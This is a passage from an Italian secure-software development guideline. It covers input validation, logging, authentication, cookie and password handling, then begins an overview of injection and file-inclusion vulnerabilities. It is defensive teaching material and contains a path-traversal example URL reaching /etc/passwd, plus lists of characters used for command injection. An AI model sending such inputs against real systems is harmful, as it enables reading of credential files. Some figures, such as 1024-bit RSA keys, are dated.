Nei casi in cui non sia possibile, tali dati devono   apparire in forma  cifrata. Per le chiavi di cifr atura e in 
generale per tutte le informazioni riservate valgon o le stesse indicazioni. 
5.2.3  Privilegi esecutivi minimi 
Quando l’applicazione viene avviata all’interno del  sistema operativo, porta con sé i privilegi dell’u tenza che 
effettua l’operazione. L’applicazione non deve esse re lanciata con i privilegi amministrativi. 
5.2.4  Metodi TRACE e TRACK 
Uno dei principi di sicurezza più saggi afferma che  ciò che non viene utilizzato dovrebbe essere disab ilitato. 
Nelle applicazioni Web è obbligatoria la disattivaz ione lato server del metodo HTTP TRACE o del metodo  
TRACK (utilizzato in ambienti Microsoft IIS ). Tali  metodi consentono al client di vedere ciò che vien e 
ricevuto dal web server. Tali informazioni possono poi essere utilizzate per organizzare un attacco di  Cross 
Site Scripting. Si parla di “Cross Site Tracing” (X ST). 
5.2.5  Assenza di codice malevolo 
L’applicazione non deve contentere alcun tipo malwa re (malicious software): virus, trojan, rootkit, wo rms, 
ramsonware, ecc.  
Sono da considerare potenzialmente pericolose anche  le backdoor amministrative, poiché consentono 
l’accesso alle macchine in rete bypassando il proce sso di autenticazione. Un attaccante che trovasse i l 
modo di manomettere una backdoor amministrativa, po trebbe penetrare nelle macchine e prenderne il 
controllo. 
5.2.6  Fattore integrità 
Il concetto di integrità del software include la re silienza agli attacchi informatici e alle violazion i della 
privacy, ma essenzialmente sta a indicare che possa no essere impedite modifiche non autorizzate. 
La fase di progettazione e la successiva fase d’imp lementazione  devono assicurare che tutti gli error i e le 
eccezioni rilevati durante il processamento e l’ela borazione dei dati acquisiti in ingresso siano 
correttamente gestiti, in modo che non causino il d anneggiamento o la perdita di integrità delle 
informazioni. 
5.2.7  Input character validation 
L’applicazione deve assicurare, attraverso opportun i meccanismi di convalida, che tutti i parametri in  input, 
specificati dall’utente, siano congruenti a quanto atteso. 
In particolare, sui dati acquisiti in ingresso, l’a pplicazione deve prevedere l’implementazione di mec canismi 
di controllo che limitino il set di caratteri o val ori, inseribili dall’utente, solo a quelli congruen ti ai campi 
richiesti e/o alle form di pertinenza, al fine di i dentificare e annullare gli effetti dei seguenti er rori: 
• Valori out-of-range o non pertinenti (ad esempio l’ immissione di caratteri non numerici nel campo 
“anno di nascita”); 
• Caratteri invalidi negli stream o nei data field; 
• Dati mancanti o incompleti; 
• Limite del minimo volume di dati richiesti non sodd isfatto o del massimo volume di dati acquisibile 
in ingresso raggiunto; 
 
 
Linee guida per lo sviluppo sicuro Pag. 15  a 156  
 
Per quanto riguarda i caratteri speciali, se presen ti/richiesti in input, sono considerati pericolosi (innescano 
diverse vulnerabilità, Cfr. [paragrafo 6.1.1]) poic hè la loro combinazione non può essere considerata 
semplice ‘testo’.  
Di seguito qualche esempio di possibile combinazion e: 
 
Caratteri pericolosi  Possibile utilizzazione  
< >  identificano tag HTML  
! | &  ;   esecuzione comandi  
' " * %   database queries  
? $ @    programmi e script  
( ) [ ]    programmi e script  
.. \./     filesystem paths  
 
 
Inoltre, caratteri speciali quali: 
; | ! ~ ' " - * % ` \ / < > ? $ @ : ( ) [ ] { } . 
 
devono essere identificati e neutralizzati (input s anitizing) con tecniche specifiche quali l’escaping  (i 
caratteri pericolosi devono essere sempre convertit i prima del salvataggio), di seguito alcuni esempi di 
sostituzione: 
 
Carattere pericoloso  Sostituito con  
<   &lt ; 
> &gt;  
# &#35;  
& &#38;  
( &#40;  
) &#41;  
 
 
Il controllo, quindi, deve sempre verificare che no n siano inseriti script potenzialmente dannosi. È 
importante sottolineare che la convalida dell’input  utente non deve mai essere svolta lato client, ma 
sempre dal back-end, sul server, poiché sul client i dati sono sempre visibili e modificabili. 
5.2.8  Gestione dell’output 
L’applicazione deve fornire in output solamente le informazioni pertinenti e conformi alle richieste 
avanzate dagli utenti, al fine di evitare qualsiasi  raccolta d’informazioni (information gathering) o 
rivelazione di dati (disclosure) non autorizzate. 
5.3  Formattazione del codice 
La formattazione del codice e la sintassi devono se guire le seguenti direttive standard: 
• Ogni file deve contenere un’intestazione (file head er) in cui si specificano l’autore del codice, la 
data di creazione dello stesso e la storia degli ag giornamenti successivi (se presenti); 
• Ogni file header deve contenere la dichiarazione di  una ed una sola classe; 
• Le dichiarazioni correlate ad una classe riportata all’interno di un file, devono essere poste 
all’interno dello stesso file; 
• Le righe di codice devono avere un numero di caratt eri uguale o inferiore a quello previsto dal 
formato ISO/ANSI per la descrizione delle dimension i dello schermo (80 caratteri x 24 righe). 
5.3.1  Stile e sintassi 
Alla dichiarazione di ogni funzione, metodo o class e deve sempre precedere un commento che riporti: 
 
 
Linee guida per lo sviluppo sicuro Pag. 16  a 156  
 
• Scopo della funzione; 
• Parametri di input e output a/dalla funzione; 
• Valori di ritorno dei parametri di output; 
• Tracciamento degli aggiornamenti del codice della f unzione (data ultima modifica). 
• Le parentesi graffe, nel codice, devono essere appo ste sulla riga superiore e inferiore rispetto alla 
dichiarazione del costrutto linguistico (struttura,  classe, funzione, metodo, etc.). 
• È raccomandato che ogni funzione assolva un unico c ompito, in maniera efficiente ed efficace.  
5.3.2  Algoritmi 
Nell'ottica di rendere l'applicazione conforme agli  standard internazionali è richiesto l’utilizzo esc lusivo di 
algoritmi riconosciuti nell’industria del software.  Gli standard internazionali devono essere strettam ente 
seguiti per lo sviluppo di algoritmi crittografici e processi di autenticazione. 
5.3.3  Utilizzo funzioni di gestione delle stringhe 
Tutto l’input utente processato dall’applicazione d eve passare per funzioni sicure di gestione delle s tringhe 
che ne prevedono il bound-checking (controllo del r ange di validità). L’applicazione deve risultare im mune 
da problematiche di tipo stack overflow, off by one /off by few overflow o heap overflow. 
5.3.4  Specifica del formato delle stringhe 
Nei sorgenti dell’applicazione il formato delle str inghe deve essere sempre specificato nei parametri delle 
funzioni che lo prevedono e mai dato per assunto. L ’applicazione deve risultare immune da problematich e 
di tipo format string overflow. 
5.3.5  Casting e variabili numeriche 
L’input utente deve essere filtrato in modo che all e variabili o strutture dati interne dell’applicazi one non 
sia possibile assegnare valori negativi (ad esempio  dichiarando array come signed integer) ad eccezion e dei 
casi previsti e per i quali sia stata pianificata l a gestione. In fase di comparazione di due variabil i numeriche 
dove il contenuto di almeno una deriva da input ute nte, il casting o l’assegnazione di un valore da un a 
variabile all’altra deve avvenire in base alla stes sa tipologia (ad esempio assegnare un valore intero  a una 
variabile di tipo short è un errore). L’applicazion e deve risultare immune da problematiche di tipo in teger 
overflow, cambi di segno, troncamento di valori num erici o altri errori di programmazione logico-
computazionali. 
5.4  Tracciamento e Raccomandazioni di “Alarm Detection”  
Per il tracciamento degli eventi di “Alarm Detectio n” si raccomanda l’adozione dei criteri generali ri portati 
nei paragrafi (Cfr. [5.4.1- 5.4.4]) che seguono. 
5.4.1  Tracciamento eventi 
L’applicazione deve essere predisposta sia per il t racciamento di attività “anomale” sia per le “eccez ioni” 
verificatesi sui sistemi.  
Il tracciamento degli eventi può essere attivato su : 
• Eventi andati a buon fine; 
• Eventi non andati a buon fine; 
• Errori di sistema o utente; 
• La configurazione del sistema di tracciamento e det ection degli allarmi sarà predisposta sulla base 
delle policy stabilite nell’ambito dei requisiti de ll’applicazione. 
 
Gli eventi per i quali è richiesto il tracciamento riguardano: 
• Autenticazione e processi correlati; 
• Start e Stop delle componenti dell’applicazione; 
• Violazioni dei criteri o delle policy configurate; 
 
 
Linee guida per lo sviluppo sicuro Pag. 17  a 156  
 
• Modifiche alle configurazioni dell’applicazione; 
• Accesso ai dati (inserimento, modifica, lettura, ri mozione), ai file e alle risorse dell’applicazione e 
tipo di accesso; 
• Disattivazione del meccanismo di tracciamento; 
• La procedura di tracciamento sarà predisposta per l ’emissione di “Alert” al verificarsi di uno o più 
eventi configurabili dall’amministratore del sistem a. 
5.4.2  Tracciamento eventi di “Alarm Detection” 
Oltre ad attenersi alle prescrizioni riportate nei paragrafi precedenti, durante lo sviluppo del codic e è 
essenziale inserire particolari funzioni di traccia mento che, operanti in determinati e specifici punt i 
dell’applicativo, permettano la rilevazione e il lo gging di eventi anomali o di frode, significativi p er la 
sicurezza dell’organizzazione. 
Attraverso l’inserimento di specifiche stringhe di codice all’interno dell’applicativo, si vogliono ri levare 
alcuni eventi ritenuti sensibili ai fini del manten imento della riservatezza, integrità e disponibilit à del dato 
applicativo. 
In seguito, le segnalazioni prodotte e inserite in appositi file di Log, discriminate per mezzo di TAG  
(DetCode) opportuni, possono essere elaborate da un  sistema di correlazione e utilizzate come fonte pe r 
attività di Audit (Ex/Post) degli eventi di sicurez za. 
 
Questa nuova strategia di rilevazione, risulta stre ttamente necessaria per superare i limiti tecnologi ci 
intrinseci delle tecnologie Anti-Intrusione commerc iali. In particolare, tali tecnologie non permetton o:  
• l’analisi di flussi applicativi di applicazioni del l’ente di tipo “Make” (le soluzioni di mercato sono  
progettate per l’esclusivo utilizzo su applicazioni  di tipo commerciale); 
• l’analisi di flussi applicativi che fanno uso di me ccanismi di cifratura delle informazioni; 
• la rilevazione di vulnerabilità software determinat e da errori in input commessi dall’utente; 
• la rilevazione di vulnerabilità software determinat e dall’assenza di controlli applicativi durante le 
operazioni di allocazione di blocchi di memoria nel le aree di memoria volatile. 
5.4.3  Scopo e campo di applicazione per eventi di “Alarm D etection” 
Il software sviluppato e personalizzato per l’organ izzazione è realizzato seguendo le indicazioni e le  
necessità espresse dall’organizzazione medesima, ne l rispetto dei vincoli di sicurezza imposti nel Pia no di 
Sicurezza (in seguito PdS). 
Nella fase di produzione e/o aggiornamento del Pian o di Sicurezza di una specifica applicazione, insie me 
all'esame del funzionamento, all’analisi delle info rmazioni da esso trattate e all’analisi dei flussi applicativi 
pertinenti (input, output, accesso a DB, autenticaz ione, ecc.), si procederà all’individuazione delle 
raccomandazioni degli eventi di Alarm Detection che  permetteranno, alle competenti linee di Sviluppo, di 
identificare e implementare gli opportuni meccanism i di generazione delle informazioni di tracciamento . 
5.4.4  Raccomandazioni generali per eventi di “Alarm Detec tion” 
L’attivazione ed il tracciamento per gli eventi di Alarm Detection, di seguito elencati, sono fortemen te 
raccomandati, poichè riguardano alcune delle princi pali debolezze applicative che, se utilizzate per s copi 
malevoli, possono comportare un elevato fattore di rischio: 
• Validazione Input : si devono tracciare tutti gli input (provenienti da Client o da Server) non 
conformi con quanto atteso dall’applicativo (Cfr. [ paragrafo 5.2.7]); 
• Buffer Overflow : si devono tracciare tutti gli avvisi e/o le eccez ioni generate dall’applicativo a 
fronte di un evento di Buffer Overflow (Cfr. [parag rafo 6.1.7]); 
• Sessioni applicative anomale : si devono tracciare le occorrenze di eventi che n on rientrano nella 
corretta gestione delle sessioni applicative, come tentativi massivi di autenticazione, sessioni 
multiple dell’utente non previste e/o consentite, p resenza di cookie con contenuti incomprensibili, 
referrer errato o inconsistente con la funzione o c on la pagina chiamata, etc.( Cfr.[paragrafo 6.1.2]) ; 
 
 
Linee guida per lo sviluppo sicuro Pag. 18  a 156  
 
• Tentativi di accesso a risorse inibite : si devono tracciare tutti i tentativi di accesso a risorse inibite 
ai servizi come, ad esempio, tentativi di accesso a lla root di un server web, modifica a 
configurazioni per mezzo di credenziali non appropr iate, etc. (Cfr. [paragrafo 5.6]); 
• Violazioni delle policy configurate : si devono tracciare le violazioni o i tentativi d i bypass delle 
regole di autorizzazione che definiscono ruolo e pe rmessi assegnati all’utente nonché le operazioni 
ad esso concesse in base alla tipologia di profilat ura (Cfr. [paragrafo 5.6]); 
• Process Issue : si devono tracciare gli avvisi, generati in ambit o Server Applicativo, relativi 
all’esecuzione di moduli applicativi che risultano diversi in quantità e dimensione rispetto a quanto 
atteso/definito in fase di progettazione/realizzazi one dell’applicativo stesso (ad es. numero 
eccessivo di istanze duplicate, esecuzione di istru zioni non previste, eccessiva occupazione di 
memoria, etc.) -(Cfr. [paragrafo 6.1.7]);  
• Funzioni input/output anomale : si devono tracciare i tentativi inaspettati di di chiarazioni di 
funzioni e/o comandi in input ed in output (Cfr. [p aragrafo 5.2.7 , 5.2.8, cap. 6]); 
• Disattivazione anomala del meccanismo di tracciamen to : devono essere osservati e tracciati tutti i 
cambiamenti di stato (attivo ↔ disattivo) delle funzioni di tracciamento e genera zione allarmi, su 
tutte le componenti funzionalmente coinvolte. Altre sì, è necessario tenere sempre sotto controllo 
le attività di download/upload dell’utente, al qual e è stato consentito l’accesso al sistema, al fine di 
individuare situazioni anomale (generazione di alla rmi laddove la quantità di dati superi una certa 
soglia che tiene conto del livello/ruolo di accesso  dell’utente). 
5.5  Compilazione dell’applicazione 
Per la compilazione del codice dell’applicazione si  raccomanda l’adozione dei criteri riportati nei pa ragrafi 
(Cfr. [5.5.1,5.5.2]) che seguono. 
5.5.1  Stack Canary 
I sorgenti dell’applicazione e delle librerie che l a compongono (DLL o altre forme comparabili in ambi enti 
operativi differenti) devono essere compilati con f unzionalità di stack canary. A runtime viene impost ato un 
valore (spesso un intero) in memoria e viene verifi cato che non venga sovrascritto da un eventuale buf fer 
overflow, dopo una chiamata allo stack. Ciò permett e di bloccare gli effetti di un buffer overflow in tempo 
utile. In fase di compilazione, devono essere attiv ate opzioni di anti-sovversione dei puntatori ai ge stori 
delle eccezioni (ad esempio SafeSEH), relativamente  alla piattaforma dell’applicazione. 
5.5.2  Correttezza del sorgente 
La compilazione dei sorgenti deve terminare senza a lcun tipo di warning. 
5.6  Ambiente operativo dell’applicazione 
In merito agli ambienti operativi di sviluppo e tes t delle applicazioni, si raccomanda l’adozione dei criteri 
riportati nei paragrafi (Cfr. [5.6.1 - 5.6.6]) che seguono. 
5.6.1  Separazione degli ambienti 
I sistemi di sviluppo, test e produzione devono ess ere separati fisicamente e/o logicamente. 
5.6.2  Test dell’Applicazione 
• L’applicazione deve essere consegnata e portata in produzione/esercizio solo dopo essere stata 
verificata la rispondenza ai requisiti dati.  
• I casi di test devono includere controlli sull’usab ilità dell’applicazione, sulla sicurezza e sulla 
compatibilità con l’infrastruttura hardware/softwar e in cui andrà installata.  
• È raccomandato l’utilizzo di appositi strumenti di stress test prima dell’avvio in esercizio 
dell’applicazione, al fine di certificare la corret ta implementazione delle procedure di input data 
validation e security menzionate in questo document o. 
 
 
Linee guida per lo sviluppo sicuro Pag. 19  a 156  
 
5.6.3  Strumenti 
Compilatori, editor ed altri strumenti di sviluppo non devono essere presenti nei sistemi di produzion e in 
cui l’applicazione risiede. 
5.6.4  Profili utente 
I profili utente dell’applicazione che risiede nei sistemi di produzione devono essere differenti da q uelli 
configurati e utilizzati nei sistemi di sviluppo e test. L’applicazione deve implementare un meccanism o di 
avviso della tipologia di profilatura, ruoli e perm essi assegnati all’utente a seguito dell’accesso (v edasi per 
maggior dettaglio “Procedura di accesso dell’applic azione” Cfr. [paragrafo 5.7.3]). 
5.6.5  Trattamento dei dati 
I dati personali e critici, gestiti dall’applicazio ne, che risiedono nell’ambiente di esercizio, non d evono 
essere copiati negli ambienti di test e sviluppo. I n caso di utilizzo dell’applicazione al solo fine d i test questi 
devono essere rimossi immediatamente dopo il comple tamento di detta fase. 
5.6.6  Protezione dei sorgenti e delle librerie 
I sorgenti dell’applicazione e delle librerie corre late, fatta eccezione per i linguaggi interpretati,  non devono 
risiedere in testo chiaro all’interno dei sistemi d i esercizio, bensì sotto forma di oggetti compilati . Nel caso 
di linguaggi interpretati, il sorgente dell’applica zione che risiede nei sistemi di esercizio deve ess ere 
offuscato.  
Una copia non offuscata deve comunque sempre essere  conservata su un supporto diverso (esempio copia 
su CD o DVD). 
5.7  Autenticazione, Autorizzazione e Gestione degli acc essi 
Per le politiche degli accessi si raccomanda l’adoz ione dei criteri riportati di seguito. 
5.7.1  Policy standard “Everything is generally forbidden u nless expressly permitted” 
L’applicazione deve implementare un meccanismo di a ccess control adeguato. Tutte le operazioni svolte 
dagli utenti e le fasi di autorizzazione e assegnaz ione dei permessi devono essere subordinate alla po licy 
standard : “Ogni azione è negata se non espressamen te consentita”. 
5.7.2  Assegnazione dei privilegi utente 
L’applicazione non deve assegnare alcun privilegio/ permesso all’utente fin quando il processo di 
autenticazione e autorizzazione non è stato complet ato. 
5.7.3  Procedura di accesso dell’applicazione 
La procedura di accesso e log-on dell’applicazione deve ridurre al minimo le informazioni fornite agli  utenti 
non ancora autenticati e prevedere determinati comp ortamenti. In particolare: 
• Non deve con messaggi specifici fornire alcun tipo di aiuto, né rendere comprensibile se il processo 
di autenticazione è fallito a causa del nome utente  o della password errata; 
• Non deve fornire alcuna chiara indicazione sui ruol i e sui permessi assegnati a un utente fin quando 
il processo di autenticazione non viene completato;  
• Deve visualizzare un messaggio di avviso sulle sanz ioni derivate dall’accesso fraudolento 
all’applicazione; 
• Deve prevedere il mascheramento della password digi tata dall’utente non rendendola visibile o 
nascondendola attraverso simboli (ad esempio con as terischi); 
• Non deve trasmettere in rete la password in chiaro;  
• Deve “processare” le informazioni fornite dall’uten te per l’accesso solo quando sono complete; 
• Deve prevedere procedure configurabili di blocco mo mentaneo dell’account dopo una serie di 
tentativi d’accesso infruttuosi; 
 
 
Linee guida per lo sviluppo sicuro Pag. 20  a 156  
 
• Deve visualizzare, al completamento della procedura  di autenticazione, la data, l’ora e le 
informazioni sull’ultimo sistema (indirizzo IP/FQDN ) che ha completato con successo la fase di log-
on per una specifica utenza; 
• Deve visualizzare nella console dell’amministratore  o nei file di log, i dettagli di tutti i precedent i 
tentativi infruttuosi di accesso per una specifica utenza; 
• L’autenticazione non deve mai essere un processo co nvalidato lato client. 
5.7.4  Account standard 
L’applicazione non deve essere rilasciata da chi la  sviluppa, con account utente standard di tipo 
amministrativo/operativo o con account protetti tra mite password di default. 
5.7.5  Autorizzazione 
L’applicazione deve sempre operare un controllo sui  reali privilegi d’accesso dell’utente prima di 
autorizzare qualsiasi operazione in lettura, scritt ura,  esecuzione o cancellazione.  
L’autorizzazione non deve mai essere un processo co nvalidato lato client. 
5.7.6  Generazione dei token 
I token dell’applicazione devono essere generati ut ilizzando algoritmi true random ed analizzati 
ogniqualvolta l’utente richiede autorizzazione a sv olgere una qualsiasi azione, al fine di determinarn e 
permessi e privilegi. 
5.7.7  Generazione dei cookie 
Nelle applicazioni web i cookie di sessione applica tiva devono essere cifrati, non persistent, avere i l flag 
secure attivato e l’attributo HttpOnly impostato. 
5.7.8  Contenuto del cookie 
Un cookie non deve contenere informazioni critiche quali password o essere composto da parti predicibi li 
come username o valori elaborati basandosi su algor itmi sequenziali. L’identificatore della sessione n el 
cookie deve avere un’entropia pari almeno a 128 bit . 
5.7.9  Scadenza del cookie 
Nelle applicazioni web, ciascun cookie generato dev e essere soggetto a un tempo di scadenza oltre il q uale 
non deve più essere considerato valido. 
5.7.10  Logout utente 
Quando un utente ha effettuato il log-out, la sessi one relativa deve essere invalidata sia sul server 
(sganciandola nella Entry Table delle sessioni atti ve) che sul client (ad esempio rimuovendo il cookie  o 
svuotando il suo contenuto). 
5.7.11  Timeout di sessione 
L’applicazione deve prevedere il rilascio della ses sione utente dopo un certo periodo configurabile di  
inattività della sessione stessa. 
5.7.12  Isolamento delle funzioni dall’applicazione 
È vietata l’implementazione della sicurezza attrave rso l’oscuramento delle funzioni a livello di 
presentazione. È obbligatorio invece isolare e rend ere inutilizzabili le funzioni che non devono esser e rese 
accessibili agli utenti, direttamente a livello log ico (es: imponendo la consultazione del token della  sessione 
per determinarne i reali privilegi di esecuzione). 
5.8  Password, chiavi e certificati 
Per la gestione di dati quali password, chiavi e ce rtificati, si raccomanda l’adozione dei criteri rip ortati di 
seguito. 
 
 
Linee guida per lo sviluppo sicuro Pag. 21  a 156  
 
5.8.1  Gestione di password, chiavi e certificati 
Le password mantenute dall’applicazione o le chiavi  private dei certificati devono essere conservate i n 
forma cifrata. Le informazioni sulle password e le chiavi devono risiedere in container (aree del file system, 
tabelle del database, ecc.) differenti rispetto ai dati dell’applicazione. 
5.8.2  Trasmissione delle password in rete 
Utilizzare protocolli crittografici, come TLS (Tran sport Layer Security) o SSH (Secure Socket Shell), che 
impiegano algoritmi standard di derivazione delle c hiavi basata su password (Password-based Key 
Derivation/key stretching) detti anche algoritmi di  slow hashing, come PBKDF2, scrypt o bcrypt, i qual i, 
rallentando di molto la funzione di hashing, rendon o inefficaci eventuali attacchi di forza bruta per il 
password cracking.  
Prevedere, inoltre, l’aggiunta di una chiave segret a alla hash, in modo tale da consentire la convalid a della 
password solo a coloro che la conoscono. Ciò si può  fare cifrando l’hash con algoritmo AES oppure 
includendo la chiave segreta nell’hash utilizzando poi un algoritmo di hashing come HMAC. 
È sconsigliato l’utilizzo di funzioni di hash critt ografico veloce come MD5, SHA-1, SHA-256, SHA-512, 
RipeMD, WHIRLPOOL, SHA-3. 
5.8.3  Generazione/conservazione delle password nel filesy stem/DB 
Le password memorizzate nel filesystem o nel DB sot to forma di hash (esempio MD5/SHA-1 etc.), devono 
prevedere l’introduzione di un ulteriore fattore ra ndomico (salt) durante la loro generazione. 
5.8.4  Batch Job dell’applicazione 
Le informazioni, i dati o gli allegati trasmessi tr amite i batch job dell’applicazione (ad esempio ses sioni ftp o 
altri protocolli di rete non cifrati o proprietari) , devono utilizzare canali di comunicazione sicuri come SSL o 
TLS, in cui le chiavi di cifratura simmetriche veng ono scambiate all’interno di una comunicazione prot etta 
attraverso algoritmo crittografico asimmetrico (Ad esempio RSA con dimensione delle chiavi uguale o 
superiore a 1024 bit). 
5.8.5  Storage dei dati applicativi 
I dati dell’applicazione memorizzati nel database o  nel filesystem devono essere cifrati tramite algor itmi 
simmetrici con chiave pari almeno a 192 bit (inclus i i bit di parità). 
5.8.6  Integrità delle informazioni 
Tutti i dati di natura critica conservati e mantenu ti dall’applicazione, oltre che cifrati, devono pre vedere 
l’utilizzo di algoritmi di hashing o firma digitale  per poterne vagliare l’integrità/autenticità. 
5.8.7  Meccanismi di autenticazione 
L’applicazione sviluppata non deve impiegare meccan ismi di autenticazione con chiave condivisa (altrim enti 
detti pre-shared secret). 
5.8.8  Non ripudio delle sessioni 
Tutte le sessioni riconducibili all’applicazione, s volte dalle utenze operative/amministrative, devono  essere, 
oltre che supportate da meccanismi di tracciamento idonei, anche cifrate con algoritmi crittografici. In 
questo modo si garantisce il non ripudio delle sing ole sessioni. Deve cioè essere possibile determinar e con 
esattezza se  un evento si è verificato o meno. 
5.8.9  Schemi di sicurezza e crittografici 
Gli schemi di sicurezza devono essere semplici e be n documentati. È vietata la predisposizione di sche mi di 
autenticazione , crittografia e/o gestione delle ch iavi non-standard, oppure fatta in proprio ("hand-m ade").. 
 
 
Linee guida per lo sviluppo sicuro Pag. 22  a 156  
 
5.8.10  Weak Keys e Collision 
Il processo di creazione/assegnazione delle chiavi di cifratura ai dati dell’applicazione, in base al cipher 
utilizzato, non deve generare weak keys (chiavi deb oli) o, nel caso di algoritmi di hashing, alcuna co llision 
(valori ripetuti). 
5.8.11  URL cifrati 
Le directory contenenti file o dati di natura perso nale, critici e sensibili, residenti nella document  root del 
web server devono apparire cifrate nell’URL del cli ent browser. 
5.8.12  Normalizzazione dei dati cifrati 
Nelle applicazioni web l’utilizzo della codifica base64  è autorizzato solo per la normalizzazione dei dati , 
delle stringhe o degli URL cifrati. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 23  a 156  
 
6 PRINCIPALI VULNERABILITÀ DERIVANTI DA ERRORI DI 
PROGRAMMAZIONE: OVERVIEW 
Nel presente capitolo viene fornita un overwiev del le principali vulnerabilità, ad oggi conosciute, ch e 
scaturiscono da errori di programmazione indicando le buone pratiche che, indipendentemente dal 
linguaggio di programmazione utilizzato, è necessar io adottare al fine di ridurre il rischio (common b est 
practices). 
A tal fine, si evidenzia che il 90% delle vulnerabi lità nel software deriva da due distinte macro-cate gorie di 
errori di programmazione:  
• una poco accorta gestione dell’input utente; 
• controlli erronei o assenti durante l’allocazione d elle aree di memoria adibite a contenere i dati.  
 
A queste macro-categorie vanno ad aggiungersi: 
• le problematiche di gestione delle sessioni utente;  
• l’assenza di meccanismi crittografici a protezione dei dati scambiati in rete o conservati su disco; 
• le vulnerabilità correlate al controllo degli acces si. 
 
Vi è inoltre un fattore di media entità che, seppur  non infici in via diretta la sicurezza di un softw are o di un 
sistema, consente a una minaccia esterna di acquisi re informazioni preziose sullo stato dell’applicazi one e 
di ottenere utili spunti per progredire gradualment e verso tecniche di attacco più complesse e sempre più 
finalizzate all’accesso fraudolento o al trafugamen to dei dati. Queste tematiche, congiuntamente a que lle 
circostanze possono indurre al blocco del sistema o  del software 
6.1  Validazione dell’input 
 Il programmatore, spesso, non si pone il problema che gli utenti autorizzati, che possiedono una rego lare 
password d’accesso, potrebbero non essere gli unici  coinvolti a interagire con l’applicazione e si dà per 
scontato che l’input acquisito, in ingresso, dal pr ogramma sarà sempre conforme e pertinente al caso.  
Le vulnerabilità di Input Validation scaturiscono p roprio dall’assenza di controlli o da errori nella gestione 
dei dati inviati dall’utente e/o da un processo est erno al dominio di analisi. Le conseguenze di tali 
vulnerabilità consistono in una serie di tecniche d i attacco differenti, solitamente finalizzate all’e secuzione 
di comandi remoti o alla visualizzazione di dati im portanti. 
È necessario quindi, verificare che l’input dell’ut ente e la sua rappresentazione non contenga caratte ri o 
sequenze di caratteri che possono essere sfruttati in modo malizioso.  
La validazione dell'input deve essere implementata utilizzando espressioni regolari, o algoritmi di fi ltro, 
dopo aver definito la lista di ciò che può essere a ccettato. La white list, contentente solo i valori ammissibili, 
è da preferire alla black list, che elenca i valori  non ammissibii, poichéil continuo evolversi degli attacchi 
rende l’insieme delle stringhe ‘non accettabili’, d i fatto, infinito. 
Le problematiche di Input Validation sono comuni a tutti gli ambienti, ma trovano la loro espressione 
massima nelle applicazioni Web. Di seguito sono tra ttate le principali vulnerabilità, causate dal manc ato 
filtro dei dati utente, nelle quali un aggressore p uò imbattersi sul Web, presentate da script, Servle t o CGI. 
6.1.1  Shell Execution Command 
Se nella casistica degli Overflow la vulnerabilità di riferimento è lo Stack Overflow, nelle applicazi oni Web è 
senza dubbio lo Shell Execution Command. Le problem atiche di Shell Execution Command, infatti, rientra no 
nella sfera delle vulnerabilità più note e più sfru ttate di sempre . Si manifesta quando i parametri a cquisiti 
in input vengono passati all’interprete di shell se nza essere filtrati. L’esecuzione di un comando non  è 
spesso possibile in modo diretto (ovvero sempliceme nte specificando ciò che si desidera eseguire), ma 
viene causata da una precisa condizione. Sui sistem i Unix è, ad esempio, possibile utilizzare il carat tere “;” 
per concatenare più comandi fra loro, mentre in mol ti altri casi la condizione scatenante può essere c ausata 
da caratteri differenti come: 
 
 
Linee guida per lo sviluppo sicuro Pag. 24  a 156  
 
• ritorno a carrello (\x0a); 
• new Line (\x0c); 
• NULL byte (\x00); 
• altri. 
 
Esempio:  
Esempio di script vulnerabile a Shell Execution Com mand: 
 
 
Contromisure 
Scrivere il codice in modo che non venga eseguita n essuna shell dei comandi.  
È deprecata l’invocazione diretta dei comandi di si stema, soprattutto se utilizza l’input utente. Per accedere 
alle funzioni del sistema operativo, è obbligatorio  utilizzare le API messe a disposizione dalle libre rie dei vari 
linguaggi di programmazione. 
Se dovessero permanere nel sorgente delle shell dip endenti dall’input dell’utente, occorre allora vali dare 
l’input, filtrando parole e caratteri potenzialment e dannosi. Meglio ancora se si verifica preventivam ente 
l’input dell’utente confrontandolo con una white li st di valori ammessi. 
6.1.2  File Inclusion 
Le problematiche di File Inclusion sono solitamente  riscontrabili nelle applicazioni web. Si sono diff use negli 
ultimi anni con il boom dei linguaggi e delle tecno logie di scripting (ASP, PHP, Python, Perl, etc..) e si 
manifestano quando i parametri passati ad uno scrip t vulnerabile non vengono opportunamente verificati  
prima di essere utilizzati per includere dei file i n determinati punti di un portale.  
Le problematiche di File Inclusion si distinguono s olitamente in due categorie: 
• Local File Inclusion : si manifestano quando un aggressore passa, come p arametri di uno script 
vulnerabile, dei file residenti localmente nel sist ema. Il loro contenuto viene così visualizzato a 
video nell’esatto punto del portale in cui si verif ica l’inclusione. Un aggressore può in questo modo 
ottenere gli hash delle password di sistema o acced ere ad informazioni riservate collocate 
all’esterno della document root del Web Server. Le problematiche di Local File Inclusion possono 
anche essere sfruttate per eseguire comandi remoti se l’aggressore ha la possibilità di collocare 
localmente un file contenente codice malevolo, che può essere puntato dallo script vulnerabile. Il 
file può essere trasmesso utilizzando i classici se rvizi di rete (ftp, ssh, cifs, etc..) o usufruendo di una 
qualsiasi procedura di upload richiamabile da Web 
• Remote File Inclusion : è la più pericolosa perché permette a un aggresso re di passare, come 
parametri di uno script vulnerabile, un file che ri siede in un altro web server (ad esempio da egli 
stesso controllato). L’aggressore può collocare all ’interno di questo file del codice di scripting (ad  
esempio codice PHP malevolo) per eseguire comandi r emoti sul sistema. 
 
Esempio:  
Un URL costruito come segue: 
http://vulnerable_host/preview.php?file=example.htm l  
Può essere modificato come segue, per visualizzare,  ad esempio, un file locale dal contenuto sensibile : 
http://vulnerable_host/preview.php?file=../../../.. /etc/passwd 
Contromisure 
Occorre evitare di utilizzare file esterni il cui c ontenuto sia di difficile verifica. Nel caso in cui  non se ne 
possa fare a meno, occorre predisporre una white li st di file ammessi. Solo tali file saranno selezion abili da 
parte dell’utente, per esempio tramite un indice nu merico. Tale approccio è molto facile da mettere in  
 
 
Linee guida per lo sviluppo sicuro Pag. 25  a 156  
 
pratica nel caso di file locali. Nel caso dei remot e files non vi è altra soluzione che verificare il contenuto o 
l’hash del file prima di adoperarlo in qualsiasi mo do. 
6.1.3  XML external entity (XXE) injection 
L' XML external entity injection, o iniezione di en tità esterne XML, nota anche come XXE, è una vulner abilità 
della sicurezza che consente a un attaccante di man ipolare l'elaborazione di dati XML da parte di 
un'applicazione web. L’attaccante può essere in gra do di accedere al file system dell’application serv er e di 
interagire con qualsiasi sistema esterno a cui l'ap plicazione stessa è autorizzata ad accedere. In alc une 
